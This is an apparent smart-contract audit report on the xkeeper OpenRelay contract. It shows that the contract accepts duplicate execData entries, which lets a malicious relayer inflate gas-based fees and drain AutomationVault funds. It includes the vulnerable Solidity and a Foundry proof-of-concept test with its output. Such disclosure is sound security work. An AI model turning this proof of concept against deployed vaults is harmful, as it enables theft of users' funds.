Eager Chambray Cricket

high

# Malicious `OpenRelayer` can drain all funds from AutomationVault duplicating multiple same `execData` in one execution.

## Summary
`OpenRelay` contract doesn't check if there are duplicated multiple `execData`.
If job contract doesn't revert for duplicated `execData` inputs in same block, malicious relayer can include multiple same `execData` in execData array to drain all funds from `AutomationVault`.

## Vulnerability Detail
OpenRelay#exec function checks only if `_execData` array is empty but not real data item in execData array, so it can be duplicated.
And the `fee` is accured based on the gas spend to execute `execData` jobs array.

```solidity
function exec(
    IAutomationVault _automationVault,
    IAutomationVault.ExecData[] calldata _execData,
    address _feeRecipient
  ) external {
@>    if (_execData.length == 0) revert OpenRelay_NoExecData();

    // Execute the automation vault counting the gas spent
@>  uint256 _initialGas = gasleft();
    _automationVault.exec(msg.sender, _execData, new IAutomationVault.FeeData[](0));
@>  uint256 _gasSpent = _initialGas - gasleft();

    // Calculate the payment for the relayer
@>  uint256 _payment = (_gasSpent + GAS_BONUS) * block.basefee * GAS_MULTIPLIER / BASE; // @audit gasSpent is double paid

    // Send the payment to the relayer
    IAutomationVault.FeeData[] memory _feeData = new IAutomationVault.FeeData[](1);
    _feeData[0] = IAutomationVault.FeeData(_feeRecipient, _NATIVE_TOKEN, _payment);
    _automationVault.exec(msg.sender, new IAutomationVault.ExecData[](0), _feeData);

    // Emit the event
    emit AutomationVaultExecuted(_automationVault, msg.sender, _execData, _feeData);
  }
```

AutomationVault.exec function checks only if relayer is approved caller and execData is approved job.
```solidity
function exec(address _relayCaller, ExecData[] calldata _execData, FeeData[] calldata _feeData) external {
    // Check that the specific caller is approved to call the relay
@>  if (!_approvedCallers[msg.sender].contains(_relayCaller) && !_approvedCallers[msg.sender].contains(_ALL)) {
      revert AutomationVault_NotApprovedRelayCaller();
    }

__SNIP__

    // Iterate over the exec data to execute the jobs
    for (_i; _i < _dataLength;) {
      _dataToExecute = _execData[_i];

      // Check that the selector is approved to be called
@>    if (!_approvedJobSelectors[msg.sender][_dataToExecute.job].contains(bytes4(_dataToExecute.jobData))) {
        revert AutomationVault_NotApprovedJobSelector();
      }
      (_success,) = _dataToExecute.job.call(_dataToExecute.jobData);
      if (!_success) revert AutomationVault_ExecFailed();

      // Emit the event
      emit JobExecuted(msg.sender, _relayCaller, _dataToExecute.job, _dataToExecute.jobData);

      unchecked {
        ++_i;
      }
    }
__SNIP__
    }
  }
```

POC
I added a test case in the `OpenRelay.t.sol`.
```solidity
function test_executeManyPayment(uint16 _howHard) public {
    vm.assume(_howHard <= 1000);

    assertEq(bot.balance, 0);

    uint256 botBalanceBefore = 0;

    IAutomationVault.ExecData[] memory _execData1 = new IAutomationVault.ExecData[](1);
    _execData1[0] =
          IAutomationVault.ExecData(address(basicJob), abi.encodeWithSelector(basicJob.workHard.selector, _howHard));
    openRelay.exec(automationVault, _execData1, bot);

    uint256 botBalanceAfterOne = bot.balance - botBalanceBefore;

    IAutomationVault.ExecData[] memory _execData500 = new IAutomationVault.ExecData[](500);
    for (uint256 i = 0; i < 500; ++i) {
      _execData500[i] =
            IAutomationVault.ExecData(address(basicJob), abi.encodeWithSelector(basicJob.workHard.selector, _howHard));
    }
    
    openRelay.exec(automationVault, _execData500, bot);
    uint256 botBalanceAfter500 = bot.balance - botBalanceAfterOne;

    assertEq(botBalanceAfterOne, botBalanceAfter500);

  }
```
Test output is following

```sh
$ forge test --match-test test_executeManyPayment -vv
[⠒] Compiling...
No files changed, compilation skipped

Ran 1 test for solidity/test/integration/OpenRelay.t.sol:IntegrationOpenRelay
[FAIL. Reason: assertion failed; counterexample: calldata=0xfb6e91380000000000000000000000000000000000000000000000000000000000000000 args=[0]] test_executeManyPayment(uint16) (runs: 0, μ: 0, ~: 0)
Logs:
  Error: a == b not satisfied [uint]
        Left: 1822613375568768
       Right: 80303504600433374
```
As you can see in test output, relay fee(keeper fee) is 0.0018 ether for one `execData`, and 0.08 ether for 500 same multiple `execData`.

Malicious relayer can repeatedly execute this function to drain all funds from the vault.

## Impact
If Job contract doesn't protect executing duplicated multiple jobs in one block, then `AutomationVault` can be drawn by malicious relayer.
  
## Code Snippet
https://github.com/sherlock-audit/2024-04-xkeeper/blob/main/xkeeper-core/solidity/contracts/relays/OpenRelay.sol#L21-L43
https://github.com/sherlock-audit/2024-04-xkeeper/blob/main/xkeeper-core/solidity/contracts/core/AutomationVault.sol#L397-L452

## Tool used

Manual Review

## Recommendation
Recommend that change `_execData` array to `EnumeratorSet` type (disable to execute same `execData` in one execution) and restrict execution of same `execData` in one block in `AutomationVault`.  